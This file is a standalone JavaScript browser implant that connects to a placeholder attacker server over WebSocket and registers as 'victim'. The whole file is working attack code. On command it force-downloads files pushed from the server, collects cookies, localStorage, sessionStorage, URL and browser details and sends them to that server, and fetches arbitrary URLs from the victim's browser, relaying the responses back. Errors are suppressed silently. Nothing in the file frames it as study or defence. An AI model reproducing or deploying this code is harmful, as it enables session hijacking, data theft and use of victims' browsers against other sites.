const socket = new WebSocket("wss://SERVER-IP:8443/ws");

socket.onopen = () => {
  socket.send("victim");
  console.log("[+] WebSocket connected (victim)");
};

socket.onmessage = async (event) => {
  const data = event.data;

  // Handle file transfer commands first.
  if (data.startsWith("file:")) {
    // Expected format: "file:filename.ext|<base64data>"
    const parts = data.split("|", 2);
    if (parts.length === 2) {
      const header = parts[0]; // "file:filename.ext"
      const base64Data = parts[1];
      const filename = header.slice(5); // Remove "file:" prefix
      // Decode base64 string to binary data
      const binary = atob(base64Data);
      const len = binary.length;
      const bytes = new Uint8Array(len);
      for (let i = 0; i < len; i++) {
        bytes[i] = binary.charCodeAt(i);
      }
      const blob = new Blob([bytes]);
      // Create a temporary download link and auto-click it
      const blobUrl = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = blobUrl;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      console.log(`File "${filename}" received (${blob.size} bytes) and automatically downloaded.`);
      socket.send(`[FILE RECEIVED] ${filename} (${blob.size} bytes)`);
    }
    return;
  }

  // Handle collect info command.
  if (data.startsWith("collectinfo:")) {
    // Expected format: "collectinfo:useragent,platform,urlref,plugins,cookies,storage"
    const fields = data.slice("collectinfo:".length).split(",");
    let results = {};
    if (fields.includes("useragent")) {
      results.useragent = navigator.userAgent;
    }
    if (fields.includes("platform")) {
      results.platform = navigator.platform;
    }
    if (fields.includes("urlref")) {
      results.url = window.location.href;
      results.referrer = document.referrer;
    }
    if (fields.includes("plugins")) {
      let plugins = [];
      for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push(navigator.plugins[i].name);
      }
      results.plugins = plugins;
    }
    if (fields.includes("cookies")) {
      results.cookies = document.cookie;
    }
    if (fields.includes("storage")) {
      let localStorageData = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        localStorageData[key] = localStorage.getItem(key);
      }
      let sessionStorageData = {};
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        sessionStorageData[key] = sessionStorage.getItem(key);
      }
      results.localStorage = localStorageData;
      results.sessionStorage = sessionStorageData;
    }
    // Send the collected information as JSON back via WebSocket.
    socket.send(`[COLLECTED INFO] ${JSON.stringify(results)}`);
    return;
  }

  // Otherwise, assume the message is a URL to fetch.
  try {
    const res = await fetch(data);
    if (res.status >= 200 && res.status < 500) {
      const text = await res.text();
      socket.send(`[✅] ${data} → ${res.status}`);
      socket.send(`[📄] Body Preview:\n${text.slice(0, 1000)}\n---`);
    }
  } catch (err) {
    // Fail silently.
  }
};
